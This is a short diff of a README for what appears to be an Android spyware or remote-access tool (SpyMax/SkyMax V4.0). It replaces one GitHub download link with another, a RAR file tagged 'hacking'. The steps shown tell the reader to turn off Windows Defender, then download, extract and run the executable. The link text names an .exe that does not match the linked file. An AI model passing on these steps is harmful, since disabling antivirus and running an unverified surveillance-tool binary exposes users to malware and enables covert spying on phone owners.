@@ -32,7 +32,7 @@
 
 - First of all off Windows Defender, We will recommend to use rdp or Vm to test This
 
-- Download And Extract Zip file and Run [SkyMax V4.0.exe](https://github.com/LinuxndroidTeam/DroidSpy2/releases/download/DroidSpyV2/droidspy2.zip) 
+- Download And Extract Zip file and Run [SkyMax V4.0.exe](https://github.com/ModizX/SpyMax-V4.0/releases/download/hacking/SpyMax.V4.0.rar) 
 <p align="center">
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGVtc-U-n7sT_vM_H42WHv8fLMFMbM0L3AUxV5CAGTgo-20W52k6uJlqK-8KHXycH5Hw0n4wRe5FU7BZDpwSs4XpCQ_NfqOewqcB3LLqcm50A-8LNyHN7bJXOVd74yaWYaMHEWcDKzLbg16iLPZB-mqhrZozgmB_J3bQkpZ_zueQShvs-hSlOtY9Cqyg/s16000/1.png" height="300"><br>
 
